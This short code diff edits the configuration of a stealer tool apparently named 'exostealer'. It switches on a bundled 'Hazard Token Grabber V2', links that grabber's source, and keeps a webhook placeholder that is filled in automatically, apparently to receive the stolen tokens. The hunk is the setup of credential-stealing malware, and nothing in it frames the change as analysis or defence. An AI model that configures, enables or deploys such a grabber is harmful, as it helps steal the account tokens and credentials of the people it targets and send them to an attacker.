@@ -39,7 +39,7 @@ exostealer_config = {
 
     # This will run Hazard Token Grabber V2
     # https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py
-    "run_hazard_grabber_v2": False,
+    "run_hazard_grabber_v2": True,
     "hazard_grabber_config": {
         # DO NOT REPLACE THE WEBHOOK STRING HERE, THIS WILL BE REPLACED AUTOMATICALLY.
         'webhook': 'DO NOT PUT ANYTHING HERE',
